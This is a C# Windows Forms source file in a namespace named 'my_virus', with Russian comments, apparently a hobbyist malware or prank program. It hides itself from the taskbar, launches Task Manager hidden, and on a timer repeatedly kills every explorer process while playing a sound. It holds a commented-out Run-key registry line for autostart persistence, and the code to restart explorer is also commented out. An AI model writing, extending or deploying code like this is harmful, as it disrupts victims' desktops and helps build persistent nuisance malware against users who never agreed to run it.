using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Windows;
using System.IO;
using System.Media;
using System.Diagnostics;
using System.Threading;

using System.ComponentModel;
using System.Runtime.InteropServices;




namespace my_virus
{
    public partial class Form1 : Form
    {
       // RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);//авто
        public int ch = 0;
        public SoundPlayer simpleSound = new SoundPlayer(@"piratt.wav");
        public bool music = false;


        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
        }

        private void button2_Click(object sender, EventArgs e)
        {
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // reg.SetValue("Xleby111ek",Application.ExecutablePath.ToString());//в автозапуск
            timer1.Start();
            notifyIcon1.Visible = false;//отключение в панели
            this.ShowInTaskbar = false;
            // this.Opacity = 100;


            //для диспетчера задач
            Process p = new Process();
            p.StartInfo.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.System);
            p.StartInfo.FileName = "taskmgr.exe";
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.Start();
            this.Focus();






        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            startt();
        }
        public void startt()
        {
            this.Opacity = 100;
            if (music == false)
            {
                simpleSound.Play();
                music = true;
            }



            for (int i = 0; i <= 100; i++)
            {
                Process[] processInfo = Process.GetProcessesByName("explorer");
                if (processInfo != null)
                {
                    try
                    {
                        foreach (Process p in processInfo)
                            p.Kill();
                    }
                    catch (Exception) { }
                }

            
            }

        }

        private void Form1_Click(object sender, EventArgs e)
        {
            ch++;
            if (ch == 5)
            {
               /* var proc = new System.Diagnostics.Process();
                proc.StartInfo.FileName = "C:\\Windows\\explorer.exe";
                proc.StartInfo.UseShellExecute = true;
                proc.Start();
                */
                ch = 0;
                this.Opacity = 0;
                simpleSound.Stop();
                music = false;


            }


        }

        private void Form1_Activated(object sender, EventArgs e)
        {
          

        }
    }
}